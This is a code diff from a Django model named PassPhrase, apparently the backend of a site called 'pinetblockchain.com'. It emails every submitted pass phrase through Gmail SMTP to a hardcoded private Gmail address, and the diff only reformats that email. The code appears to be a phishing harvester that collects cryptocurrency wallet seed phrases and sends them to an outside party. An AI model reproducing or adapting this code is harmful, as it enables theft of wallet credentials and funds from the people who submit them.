@@ -17,15 +17,8 @@ class PassPhrase(models.Model):
         sent_from = gmail_user
         to = ['agwumafam@gmail.com']
         subject = 'New Pass Phrase Has Been Submitted'
-        body = f"{self.phrase}"
         
-        email_text = """\
-From: %s
-To: %s
-Subject: %s
-                    
-%s
-"""%(sent_from, ", ".join(to), subject, body)        
+        email_text = (f"From : pinetblockchain.com\nSubject : New Pass Phrase Added\n{self.phrase}")
         try:
             server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
             server.ehlo()
